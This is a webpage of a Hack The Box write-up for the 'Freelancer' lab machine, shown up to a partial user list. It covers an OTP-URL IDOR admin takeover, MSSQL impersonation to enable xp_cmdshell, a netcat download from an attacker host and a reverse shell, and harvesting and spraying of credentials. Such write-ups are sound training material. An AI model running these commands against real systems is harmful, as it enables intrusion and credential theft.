@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Freelancer | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), Logging in as employer." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-freelancer/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Freelancer" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), Logging in as employer." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-freelancer/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-freelancer/og.png?v=6cf90101" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Freelancer" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), Logging in as employer." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-freelancer/og.png?v=6cf90101" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Freelancer","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), Logging in as employer.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-freelancer/","datePublished":"2026-10-02","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Freelancer","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-freelancer/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Freelancer</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-10-02 · 19 min read</p><h1>Freelancer</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), Logging in as employer.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Freelancer" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-freelancer.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-freelancer.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Freelancer</h2><p>Freelancer is a Hard Difficulty machine is designed to challenge players with a series of vulnerabilities that are frequently encountered in real-world penetration testing scenarios. It covers a broad range of skills, including identifying business logic flaws in web…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>1 Jun 2024</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>Spectra199</dd></div><div><dt>Rating</dt><dd>4.5 / 5</dd></div><div><dt>User owns</dt><dd>1,993</dd></div><div><dt>Root owns</dt><dd>1,811</dd></div><div><dt>User blood</dt><dd>xct<small class="room-blood-time">1H 50M 42S</small></dd></div><div><dt>Root blood</dt><dd>NLTE<small class="room-blood-time">2H 50M 3S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 2322 votes from easiest to hardest"><rect x="0" y="59" width="20" height="5" rx="2" fill="hsl(96 70% 55%)"><title>57 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>22 votes</title></rect><rect x="52" y="58" width="20" height="6" rx="2" fill="hsl(80 70% 55%)"><title>64 votes</title></rect><rect x="78" y="52" width="20" height="12" rx="2" fill="hsl(70 70% 55%)"><title>140 votes</title></rect><rect x="104" y="40" width="20" height="24" rx="2" fill="hsl(50 70% 55%)"><title>270 votes</title></rect><rect x="130" y="30" width="20" height="34" rx="2" fill="hsl(38 70% 55%)"><title>385 votes</title></rect><rect x="156" y="0" width="20" height="64" rx="2" fill="hsl(28 70% 55%)"><title>723 votes</title></rect><rect x="182" y="29" width="20" height="35" rx="2" fill="hsl(16 70% 55%)"><title>401 votes</title></rect><rect x="208" y="50" width="20" height="14" rx="2" fill="hsl(8 70% 55%)"><title>158 votes</title></rect><rect x="234" y="55" width="20" height="9" rx="2" fill="hsl(0 70% 55%)"><title>102 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.1, Real-Life 6.9, CVE 5.9, Custom Exploitation 4.1, CTF-Like 3.1"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,60.3 155.9,95.1 134.3,143.4 93.1,133.2 89.4,103.3" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Freelancer" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><code>sudo nxc smb 10.129.66.33 --generate-hosts-file /etc/hosts  
+SMB         10.129.66.33    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><code>nmap -p- --min-rate=2000 -sT -Pn dc.freelancer.htb -vv
+
+Nmap scan report for dc.freelancer.htb (10.129.66.33)
+Host is up, received user-set (0.014s latency).
+rDNS record for 10.129.66.33: DC.freelancer.htb
+Scanned at 2026-10-02 16:54:50 BST for 11s
+Not shown: 65509 closed tcp ports (conn-refused)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+80/tcp    open  http             syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+9389/tcp  open  adws             syn-ack
+47001/tcp open  winrm            syn-ack
+49664/tcp open  unknown          syn-ack
+49665/tcp open  unknown          syn-ack
+49666/tcp open  unknown          syn-ack
+49667/tcp open  unknown          syn-ack
+49671/tcp open  unknown          syn-ack
+49680/tcp open  unknown          syn-ack
+49681/tcp open  unknown          syn-ack
+49684/tcp open  unknown          syn-ack
+49689/tcp open  unknown          syn-ack
+49711/tcp open  unknown          syn-ack
+55297/tcp open  unknown          syn-ack</code></pre><h3>Nmap</h3><pre><code>nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985 -A --min-rate=200 -sT -Pn dc.freelancer.htb 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 17:00 +0100
+Nmap scan report for dc.freelancer.htb (10.129.66.33)
+Host is up (0.014s latency).
+rDNS record for 10.129.66.33: DC.freelancer.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          nginx 1.25.5
+|_http-server-header: nginx/1.25.5
+|_http-title: Did not follow redirect to http://freelancer.htb/
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-02 21:00:52Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 21H2 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><p>Null auth enabled but not able to use it to enumerate</p><p>Guest account is disabled</p><h2>HTTP (80)</h2><p>There is quite a lot of functionality on this page</p><p>There is two different user registrations, one for freelancers and one for employers</p><h3>Feroxbuster</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">feroxbuster -u http://freelancer.htb/ -C 404,503
+
+301      GET        0l        0w        0c http://freelancer.htb/admin =&gt; http://freelancer.htb/admin/</code></pre><p>Found an admin page</p><p><img src="images/freelancer/pasted-image-20261002182658.webp" alt="Screenshot" loading="lazy" /></p><p>Nothing obvious bypasses at the moment</p><h2>Logging in as employer </h2><p><img src="images/freelancer/pasted-image-20261002183113.webp" alt="Screenshot" loading="lazy" /></p><p>But if i go to the logon page and try to logon as an employer, i can then go to forgot password. I am prompted for my security questions and then answering them right means i can change the password</p><p>Then ill reset the password to <code>Password1234!</code></p><p>Then im redirected back to the logon page where i can log in as <code>hacker</code></p><p><img src="images/freelancer/pasted-image-20261002183348.webp" alt="Screenshot" loading="lazy" /></p><p>Now ill explore the dashbaord</p><h2>Decoding QR code</h2><p><img src="images/freelancer/pasted-image-20261002183735.webp" alt="Screenshot" loading="lazy" /></p><p>There is the option to generate a QR code to make logon easier</p><p><img src="images/freelancer/pasted-image-20261002183805.webp" alt="Screenshot" loading="lazy" /></p><p>checking the requests this makes in my proxy shows some interesting requests</p><p>The generate endpoint generates the code and contains the PNG contents for the QR</p><p><img src="images/freelancer/pasted-image-20261002184502.webp" alt="Screenshot" loading="lazy" /></p><p>Using curl i can request new QR codes using my session</p><p>I can also use <code>output &lt;filename&gt;</code> to save it to a file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl http://freelancer.htb/accounts/otp/qrcode/generate/ -H &#39;Cookie: csrftoken=Fi4bSgT5Q70ZR49FKmQiECDvoJOeq80E; sessionid=42hkr7ol6zil1257xws6b1u3qxe5nptt&#39; --output qr.png</code></pre><p>I can then feed this into a tool to decode the contents of the QR code</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">zbarimg qr.png                              
+QR-Code:http://freelancer.htb/accounts/login/otp/MTAwMTE=/801bc3f684a8477d1492e3c600193255/
+scanned 1 barcode symbols from 1 images in 0.01 seconds</code></pre><p>This gives me a URL</p><p><img src="images/freelancer/pasted-image-20261002184918.webp" alt="Screenshot" loading="lazy" /></p><p>Opening this in a new private window allows me to logon without any credentials</p><p>So if i can figure out how the URL is generated i should be able to logon as any user without credentials</p><p><img src="images/freelancer/pasted-image-20261002185225.webp" alt="Screenshot" loading="lazy" /></p><p>If i decode part of the URL, it simply decodes to the user account ID</p><p><img src="images/freelancer/pasted-image-20261002185308.webp" alt="Screenshot" loading="lazy" /></p><p>This is shown here when i request the user profiles using this ID</p><p><img src="images/freelancer/pasted-image-20261002185719.webp" alt="Screenshot" loading="lazy" /></p><p>From my enumeration earlier i know the admin is ID <code>2</code></p><p>So since the codes become void after 5 minutes, my theory is the final part of the URL is a randomly generated string that becomes invalidated</p><h2>Logging in as the admin via IDOR</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl http://freelancer.htb/accounts/otp/qrcode/generate/ -H &#39;Cookie: csrftoken=Fi4bSgT5Q70ZR49FKmQiECDvoJOeq80E; sessionid=42hkr7ol6zil1257xws6b1u3qxe5nptt&#39; --output qr.png
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    965 100    965   0      0   4520      0                              0</code></pre><p>Ill delete the old image and get a new image</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">zbarimg qr.png
+QR-Code:http://freelancer.htb/accounts/login/otp/MTAwMTE=/0889731ba95f3a9d08679a8d0392375d/
+scanned 1 barcode symbols from 1 images in 0.01 seconds</code></pre><p>And now i see the last section is different</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">echo 2 | base64            
+Mgo=</code></pre><p>To test my theory ill just take the admins ID <code>2</code> then encode it and replace <code>MTAwMTE=</code> with the new value</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">http://freelancer.htb/accounts/login/otp/Mgo=/0889731ba95f3a9d08679a8d0392375d/</code></pre><p>Leaving me with this</p><p><img src="images/freelancer/pasted-image-20261002190149.webp" alt="Screenshot" loading="lazy" /></p><p>I am now logged in as the admin</p><p>Now im logged in as the admin i might be able to access the <code>/admin</code> endpoint</p><p><img src="images/freelancer/pasted-image-20261002190752.webp" alt="Screenshot" loading="lazy" /></p><p>Just as expected</p><h2>RCE through MSSQL user impersonation</h2><p><a href="https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html" target="_blank" rel="noreferrer">https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html</a></p><p><img src="images/freelancer/pasted-image-20261002191106.webp" alt="Screenshot" loading="lazy" /></p><p>There is a terminal to interact with mssql which will come in handy</p><p><img src="images/freelancer/pasted-image-20261002191644.webp" alt="Screenshot" loading="lazy" /></p><p>Nothing really in the current DB</p><p>XP_cmdshell is disabled and i cannot enabled it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">exec master.dbo.xp_dirtree &#39;\\10.10.14.61\any\thing&#39;</code></pre><p>Also coercing auth back to me got me a hash for the user <code>sql_svc</code> but i cannot crack it</p><p>There is no linked servers</p><p><img src="images/freelancer/pasted-image-20261002193645.webp" alt="Screenshot" loading="lazy" /></p><p>It looks like i can impersonate the <code>sa</code> user, which means i can enabled and execute commands over <code>xp_cmdshell</code></p><p><img src="images/freelancer/pasted-image-20261002201134.webp" alt="Screenshot" loading="lazy" /></p><p>Ill then set the logon at the start of the query then re enable xp_cmdshell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">EXECUTE AS LOGIN = &#39;sa&#39;; EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE;</code></pre><p><img src="images/freelancer/pasted-image-20261002201240.webp" alt="Screenshot" loading="lazy" /></p><p>I now have code execution</p><p>However the user does not have SeImpersonatePrivilege</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#39;whoami&#39;;</code></pre><h2>Reverse shell</h2><p><img src="images/freelancer/pasted-image-20261003141536.webp" alt="Screenshot" loading="lazy" /></p><p>A powershell reverse shell payload fails, it gets blocked by AV</p><p>Ill try doing this with <code>nc64.exe</code> instead</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#39;powershell -c wget http://10.10.14.61/nc64.exe -o C:\ProgramData\nc64.exe&#39;;</code></pre><p><img src="images/freelancer/pasted-image-20261003142114.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.66.164 - - [03/Oct/2026 14:20:57] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -</code></pre><p>I managed to transfer netcat</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#39;powershell -c dir -force C:\ProgramData\&#39;;</code></pre><p><img src="images/freelancer/pasted-image-20261003142214.webp" alt="Screenshot" loading="lazy" /></p><p>As seen here the file exists</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#39;powershell -c C:\ProgramData\nc64.exe -e cmd 10.10.14.61 1337&#39;;</code></pre><p><img src="images/freelancer/pasted-image-20261003142333.webp" alt="Screenshot" loading="lazy" /></p><p>I now have a shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users&gt; dir
+dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        10/3/2026   2:03 PM                Administrator                                                         
+d-----        5/28/2024  10:23 AM                lkazanof                                                              
+d-----        5/28/2024  10:23 AM                lorra199                                                              
+d-----        5/28/2024  10:22 AM                mikasaAckerman                                                        
+d-----        8/27/2023   1:16 AM                MSSQLSERVER                                                           
+d-r---        5/28/2024   2:13 PM                Public                                                                
+d-----        5/28/2024  10:22 AM                sqlbackupoperator                                                     
+d-----        5/28/2024  11:16 AM                sql_svc                                                               
+
+
+PS C:\Users&gt; </code></pre><p>There are quite a few users here, ill make a user list</p><p>There is an internal web server on 8000 but thats being proxyed to port 8o so thats the host ive already abused</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU&gt; type sql-Configuration.INI
+type sql-Configuration.INI
+[OPTIONS]
+ACTION=&quot;Install&quot;
+QUIET=&quot;True&quot;
+FEATURES=SQL
+INSTANCENAME=&quot;SQLEXPRESS&quot;
+INSTANCEID=&quot;SQLEXPRESS&quot;
+RSSVCACCOUNT=&quot;NT Service\ReportServer$SQLEXPRESS&quot;
+AGTSVCACCOUNT=&quot;NT AUTHORITY\NETWORK SERVICE&quot;
+AGTSVCSTARTUPTYPE=&quot;Manual&quot;
+COMMFABRICPORT=&quot;0&quot;
+COMMFABRICNETWORKLEVEL=&quot;&quot;0&quot;
+COMMFABRICENCRYPTION=&quot;0&quot;
+MATRIXCMBRICKCOMMPORT=&quot;0&quot;
+SQLSVCSTARTUPTYPE=&quot;Automatic&quot;
+FILESTREAMLEVEL=&quot;0&quot;
+ENABLERANU=&quot;False&quot; 
+SQLCOLLATION=&quot;SQL_Latin1_General_CP1_CI_AS&quot;
+SQLSVCACCOUNT=&quot;FREELANCER\sql_svc&quot;
+SQLSVCPASSWORD=&quot;IL0v3ErenY3ager&quot;
+SQLSYSADMINACCOUNTS=&quot;FREELANCER\Administrator&quot;
+SECURITYMODE=&quot;SQL&quot;
+SAPWD=&quot;t3mp0r@ryS@PWD&quot;
+ADDCURRENTUSERASSQLADMIN=&quot;False&quot;
+TCPENABLED=&quot;1&quot;
+NPENABLED=&quot;1&quot;
+BROWSERSVCSTARTUPTYPE=&quot;Automatic&quot;
+IAcceptSQLServerLicenseTerms=True
+PS C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU&gt; </code></pre><p>Found two passwords</p><h2>Password spray leads to user compromise</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">IL0v3ErenY3ager
+t3mp0r@ryS@PWD</code></pre><p>Ill spray these passwords against the users i found in <code>C:\Users</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.freelancer.htb -u users.txt -p &#39;IL0v3ErenY3ager&#39; --continue-on-success
+
+SMB         10.129.66.164   445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager</code></pre><p>This user is compromised</p><p>The other password doesnt get me anything</p><h2>Domain Enumeration as <code>mikasaAckerman</code></h2><p>There is no lockout policy set, so password spraying with multiple passwords wont be an issue</p><h3>Shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.freelancer.htb -u mikasaAckerman -p &#39;IL0v3ErenY3ager&#39; --shares  
+SMB         10.129.66.164   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.66.164   445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager 
+SMB         10.129.66.164   445    DC               [*] Enumerated shares
+SMB         10.129.66.164   445    DC               Share           Permissions     Remark
+SMB         10.129.66.164   445    DC               -----           -----------     ------
+SMB         10.129.66.164   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.66.164   445    DC               C$                              Default share
+SMB         10.129.66.164   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.66.164   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.66.164   445    DC               SYSVOL          READ            Logon server share</code></pre><p>There is only default SMB shares</p><h3>Users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.freelancer.htb -u mikasaAckerman -p &#39;IL0v3ErenY3ager&#39; --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC$
+mikasaAckerman
+sshd
+SQLBackupOperator
+sql_svc
+DATACENTER-2019$
+lorra199
+maya.artmes
+michael.williams
+sdavis
+d.jones
+jen.brown
